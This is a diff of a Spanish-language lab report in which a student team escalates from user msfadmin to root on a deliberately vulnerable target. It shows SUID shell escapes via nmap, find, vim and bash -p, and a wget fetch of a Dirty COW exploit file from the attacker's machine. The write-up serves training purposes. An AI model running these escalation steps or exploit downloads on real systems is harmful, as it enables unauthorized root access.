@@ -52,7 +52,7 @@ EQUIPO 4: Escalada ← ← ← ← EQUIPO 5: Exfiltración y Persistencia
 
 **Fase: Privilege Escalation**
 
-**Objetivo**
+## Objetivo
 
 Escalar privilegios desde el usuario comprometido (msfadmin) hasta obtener acceso root completo, utilizando múltiples técnicas y vectores identificados por el Equipo 3.
 
@@ -61,9 +61,9 @@ Escalar privilegios desde el usuario comprometido (msfadmin) hasta obtener acces
 Eres el equipo de **Escalada de Privilegios**. Tienes acceso como usuario limitado. Tu misión es convertirte en root usando al menos **3 técnicas diferentes**.
 
 -----
-**📝 PROCEDIMIENTO PASO A PASO**
+## 📝 PROCEDIMIENTO PASO A PASO
 
-**Preparación: Establecer Acceso**
+### Preparación: Establecer Acceso
 
 Se conectó desde la máquina "Analista", la máquina atacante, mediante el protocolo ssh usando el shortcut creado previamente por el equipo 2, luego de ello se ejecutaron los coamndos whoami e id para verificar el nombre de usuario, el nombre del grupo principal al cual pertenece y sus GID(Identificadores de grupo) para verficiar que efectivamente se accdeió con el usaurio "msfadmin" de la máquina objetvio desde la máquina atacante.
 
@@ -80,13 +80,13 @@ Luego de ello, se procedió a crear el directorio de trabajo con el comando mkdi
 `cd /tmp/equipo4\_privesc`
 
 -----
-**🎯 TÉCNICA 1: Explotación de Binarios SUID**
+### 🎯 TÉCNICA 1: Explotación de Binarios SUID**
 
 El primer método a probar es la explotación de los archivos con bit SUID ya que estos se ejecutan con los permisos del propietario (generalmente root), no del usuario que los ejecuta.
 
 El SUID(**Set User ID**) es un permiso especial en los sistemas operativos tipo UNIX que como se estableció arriba permite que cualquier usuario ejecuta los archivos con los permisos que posee el usuario propietario del archivo, esto es una vulnerabilidad que puede ser explotada con el motivo de conseguir acceso no autorizado al sistema.
 
-**Paso 1: Identificar Binarios SUID**
+##### **Paso 1: Identificar Binarios SUID**
 
 Se ejecutó el comando `find / -perm -4000 -type f 2>/dev/null > suid\_binaries.txt` para encontrar los archivos con el bit SUID activado, la parte del comando `find / -perm -4000 -type f` se encarga de realizar la búsqueda de los archivos con el bit SUID, a continuacion se presenta una explicación de las estrucutra del comando:
    * **find /:** Inicia la búsqueda desde la raíz del sistema (/) y recorre todo el árbol de directorios.
@@ -101,31 +101,21 @@ Luego de la ejecución anterior se ejecutó `cat suid\_binaries.txt` para visual
 
 Se ejecutó el comando `find / -perm -4000 -type f 2>/dev/null | grep -E "nmap|vim|find|bash|more|less|nano|cp"` para poder encontrar los archivos con el bit SUID que cumplan con la expresión regular establecida, esto se logra ya que el operador pip ( | ) permite conectar dos comandos y en este caso se está conectando la primera parte del comando anterior con el comando `grep -E "nmap|vim|find|bash|more|less|nano|cp"` ya que este tiene como fin filtrar la lista formada por la primera parte para que solo se visualicen los comandos que cumplan con la expresión regular `"nmap|vim|find|bash|more|less|nano|cp", la bandera `-E` en el comando grep habilitar el uso de las expresiones regulares extendidas como criterio de filtro y el pipe dentro de la expresion permite concatenar las condiciones haciendo que funcione como un operador lógico OR.
 
-**Paso 2: Explotar nmap (si está con SUID)**
+#### **Paso 2: Explotar nmap (si está con SUID)**
 
-\# Verificar si nmap tiene SUID
+Se ejecutó el comando `ls -la /usr/bin/nmap` para comprobar que nmap contiene el bit de SUID activado para usarse como vector de escalada de privilegios, efectivamente el comando arrojó que el archivo ejecutable de nmap tiene el bit encendido.
 
-ls -la /usr/bin/nmap
+Se ejecuto `nmap --interactive` para ejecutar el programa de nmap en modo interactivo, cabe destacar que al tener el bit SUID encendido el proceso temporalmente los privilegios de su propietario, en este caso root.
 
-\# Versiones antiguas de nmap tienen modo interactivo
+Posteriormente se ejecutó `nmap> !sh` para abrir una shell, una shell es un programa que actúa como una **interfaz de línea de comandos (CLI)** entre el **usuario** y el **núcleo (kernel) del sistema operativo**. Al haberse ejecutado el proceso con los permisos de root, la shell resultante hereda los mismos lo que hace que la escalada de privilegios sea exitos al ahora tener el usuario root en control para ejecutar acciones sobre el objetivo.
 
-nmap --interactive
+Para comprobar que efectivamente ahora se está en el usuario root se ejecutaron los coamndos `whoami` y `id` para verificar el usuario actual y sus diferentes IDs correspondientes a su rol dentro del sistema dando como resultado la escalada exitosa como se puede ver en la imagen de abajo.
 
-nmap> !sh
+![acceso-root](image-3.png)
 
-\# Ahora deberías tener una shell como root
+Por último, se ejecutó `echo "Root via nmap SUID - Equipo 4" > /root/equipo4\_nmap\_root.txt` para escribir dentro u=de un archivo txt ubicado en la carpeta root un mensaje que sirva como prueba irrefutable de que se logró la escalada de privilegios en el sistema.
 
-\# Verificar
-
-whoami  # Debería mostrar: root
-
-id
-
-\# Crear evidencia
-
-echo "Root via nmap SUID - Equipo 4" > /root/equipo4\_nmap\_root.txt
-
-**Paso 3: Explotar otros binarios SUID comunes**
+#### **Paso 3: Explotar otros binarios SUID comunes**
 
 **find con SUID:**
 
@@ -145,14 +135,36 @@ vim -c ':!/bin/sh'
 
 /bin/bash -p
 
+Los comandos ubicados previamente a este párrafo fueron ejecutado pero fueron redundantes al ya haber escalado los privilegios mediante la explotación de la verisón antigua de nmap por lo que nos detallará tanto en ellos, lo que se hará es presentar tablas con los componentes de cada comando y explicar su función dentro de la escalada de privilegios.
+
+| Comando | Acción | Resultado con SUID |
+| :--- | :--- | :--- |
+| **`find /home`** | Inicia la búsqueda en `/home`. | El proceso de `find` se ejecuta con privilegios de **root**. |
+| **`-exec /bin/sh \;`** | Ejecuta el comando `/bin/sh` (una shell) por cada archivo encontrado. | La shell se lanza como un subproceso, **heredando los privilegios de root**. |
+| **`-quit`** | Detiene `find` inmediatamente. | Asegura que la shell de root se lance de forma rápida. |
+
+**Comando Completo:** `find /home -exec /bin/sh \; -quit`
+
+| Comando | Acción | Resultado con SUID |
+| :--- | :--- | :--- |
+| **`vim -c`** | Inicia el editor `vim` y ejecuta un comando interno. | El proceso de `vim` se ejecuta con privilegios de **root**. |
+| **`':!/bin/sh'`** | El **`!`** le indica a `vim` que ejecute el comando `/bin/sh` en el sistema operativo. | La shell (`/bin/sh`) se lanza como un subproceso, **heredando los privilegios de root**. |
+
+**Comando Completo:** `vim -c ':!/bin/sh'`
+
+Comando | Acción | Resultado con SUID |
+| :--- | :--- | :--- |
+| **`/bin/bash`** | Ejecuta el intérprete de comandos Bash. | El proceso de `bash` se inicia con privilegios de **root**. |
+| **`-p`** | El flag de **Preserve** (preservar). | Fuerza a `bash` a **mantener** los privilegios elevados de **root** obtenidos por el SUID. |
+
+**Comando Completo:** `/bin/bash -p`
+
 -----
-**🎯 TÉCNICA 2: Explotación del Kernel**
+### 🎯 TÉCNICA 2: Explotación del Kernel**
 
-**Contexto**
+El segundo método a probar es la explotación del Kernel debido a que Kernels antiguos tienen vulnerabilidades conocidas que permiten escalada de privilegios local.
 
-Kernels antiguos tienen vulnerabilidades conocidas que permiten escalada de privilegios local.
-
-**Paso 1: Identificar Versión del Kernel**
+#### **Paso 1: Identificar Versión del Kernel**
 
 uname -a
 
@@ -198,7 +210,7 @@ python3 -m http.server 8000
 
 cd /tmp/equipo4\_privesc
 
-wget http://<IP\_KALI>:8000/dirtycow.c
+wget http://192.168.100.9:8000/40839.c
 
 \# Opción B: Usar SCP
 
